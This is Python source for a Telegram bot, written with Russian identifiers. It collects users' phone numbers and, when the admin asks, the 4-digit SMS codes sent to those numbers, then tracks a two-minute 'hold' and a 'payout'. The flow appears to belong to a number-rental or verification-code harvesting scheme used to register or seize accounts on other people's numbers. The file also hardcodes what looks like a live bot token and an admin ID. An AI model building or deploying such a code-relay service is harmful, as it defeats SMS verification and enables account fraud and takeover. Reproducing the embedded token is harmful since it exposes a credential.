import os, requests, json, threading
from flask import Flask, request

app = Flask(__name__)

# ===== НАСТРОЙКИ (ЗАМЕНИ ТОКЕН И ADMIN ID) =====
TOKEN = "8897748741:AAG2f8sHicGX_wxGEBPm2gqgbULhkGp4weE"
ADMIN = 5979001063  # твой Telegram ID (узнай у @userinfobot)
# ===============================================

URL = f"https://api.telegram.org/bot{TOKEN}/"
заявки = {}
счетчик = 1

меню = {"keyboard": [[{"text":"📝 Новая заявка"}],[{"text":"📋 Мои заявки"}]],"resize_keyboard":True}
админ_меню = {"keyboard": [[{"text":"📋 Список"}],[{"text":"💰 Выплаты"}]],"resize_keyboard":True}

def отправить(куда, текст, клава=None):
    данные = {"chat_id": куда, "text": текст}
    if клава: данные["reply_markup"] = json.dumps(клава)
    requests.post(URL + "sendMessage", data=данные)

def кнопки(ид, статус):
    таблица = {
        "новая": [[{"text":"🔑 Запросить код","callback_data":f"код_{ид}"}]],
        "код_есть": [[{"text":"✅ Принять","callback_data":f"да_{ид}"},{"text":"❌ Отклонить","callback_data":f"нет_{ид}"}]],
        "холд": [[{"text":"💸 Выплатить","callback_data":f"плати_{ид}"}]]
    }
    return {"inline_keyboard": таблица.get(статус, [])}

@app.route(f"/{TOKEN}", methods=["POST"])
def вебхук():
    данные = request.get_json()
    if "message" in данные:
        сообщение = данные["message"]
        юзер = сообщение["from"]["id"]
        чат = сообщение["chat"]["id"]
        текст = сообщение.get("text")
        админ = (юзер == ADMIN)

        if текст == "/start":
            отправить(чат, "✅ Бот готов! Выбери действие:", меню if not админ else админ_меню)
            return "ok", 200

        состояние = заявки.get(юзер, {}).get("state", "")

        if состояние == "waiting_code":
            if текст and текст.isdigit() and len(текст) == 4:
                тикет = заявки[юзер]["current"]
                if тикет in заявки and заявки[тикет]["status"] == "waiting":
                    заявки[тикет]["код"] = текст
                    заявки[тикет]["status"] = "код_есть"
                    заявки[юзер]["state"] = ""
                    отправить(чат, "✅ Код получен! Админ проверит.", меню)
                    отправить(ADMIN, f"📝 Код для заявки #{тикет}: {текст}", кнопки(тикет, "код_есть"))
            else:
                отправить(чат, "❌ Введи 4 цифры")
            return "ok", 200

        if состояние == "waiting_phone":
            телефон = текст.strip()
            if телефон.startswith("+") and len(телефон) >= 10:
                global счетчик
                тикет = счетчик
                счетчик += 1
                заявки[тикет] = {"user": юзер, "phone": телефон, "status": "новая"}
                заявки[юзер]["state"] = ""
                отправить(чат, f"✅ Заявка #{тикет} создана! Жди ответа.", меню)
                отправить(ADMIN, f"🆕 НОВАЯ ЗАЯВКА #{тикет}\n📞 {телефон}", кнопки(тикет, "новая"))
            else:
                отправить(чат, "❌ Ошибка! Пример: +79001234567")
            return "ok", 200

        if админ:
            if текст == "📋 Список":
                новых = len([t for t in заявки.values() if t.get("status") == "новая"])
                отправить(чат, f"📋 Новых заявок: {новых}", админ_меню)
            elif текст == "💰 Выплаты":
                холд = len([t for t in заявки.values() if t.get("status") == "холд"])
                отправить(чат, f"💰 Готовы к выплате: {холд}", админ_меню)
            return "ok", 200

        if текст == "📝 Новая заявка":
            заявки[юзер] = {"state": "waiting_phone"}
            отправить(чат, "📞 Введи номер телефона:\nПример: +79001234567")
        elif текст == "📋 Мои заявки":
            мои = [t for t in заявки.values() if t.get("user") == юзер]
            спс = "\n".join([f"#{i} {t['phone']} — {t.get('status','')}" for i,t in enumerate(мои)]) or "Нет заявок"
            отправить(чат, f"📋 Твои заявки:\n{спс}", меню)

    elif "callback_query" in данные:
        кнопка = данные["callback_query"]
        юзер = кнопка["from"]["id"]
        данные_кнопки = кнопка["data"]
        requests.post(URL + "answerCallbackQuery", data={"callback_query_id": кнопка["id"]})

        if юзер == ADMIN:
            действие, тикет = данные_кнопки.split("_")
            тикет = int(тикет)
            if тикет not in заявки: return "ok", 200

            if действие == "код":
                заявки[тикет]["status"] = "waiting"
                заявки[заявки[тикет]["user"]]["state"] = "waiting_code"
                заявки[заявки[тикет]["user"]]["current"] = тикет
                отправить(заявки[тикет]["user"], "🔑 Введи код из SMS (4 цифры):")
                отправить(ADMIN, f"✅ Запрошен код для #{тикет}")

            elif действие == "да":
                заявки[тикет]["status"] = "холд"
                отправить(заявки[тикет]["user"], "✅ Номер подтверждён! ХОЛД 2 минуты")
                отправить(ADMIN, f"✅ Заявка #{тикет} подтверждена", кнопки(тикет, "холд"))
                def слет():
                    if тикет in заявки and заявки[тикет].get("status") == "холд":
                        заявки[тикет]["status"] = "слет"
                        отправить(ADMIN, f"⏰ Холд #{тикет} истёк")
                threading.Timer(120, слет).start()

            elif действие == "нет":
                заявки[тикет]["status"] = "отказ"
                отправить(заявки[тикет]["user"], "❌ Заявка отклонена")
                отправить(ADMIN, f"❌ Заявка #{тикет} отклонена")

            elif действие == "плати":
                if заявки[тикет].get("status") == "холд":
                    заявки[тикет]["status"] = "оплачено"
                    отправить(заявки[тикет]["user"], "💰 ВЫПЛАЧЕНО! Спасибо за использование сервиса.")
                    отправить(ADMIN, f"💰 Выплата по заявке #{тикет} произведена")

    return "ok", 200

@app.route("/")
def домой():
    return "Бот работает", 200

if __name__ == "__main__":
    хост = os.environ.get("RENDER_EXTERNAL_HOSTNAME")
    if хост:
        вебхук_урл = f"https://{хост}/{TOKEN}"
        requests.post(URL + "deleteWebhook")
        requests.post(URL + "setWebhook", data={"url": вебхук_урл})
        print(f"✅ Вебхук установлен: {вебхук_урл}")
    app.run(host="0.0.0.0", port=10000)
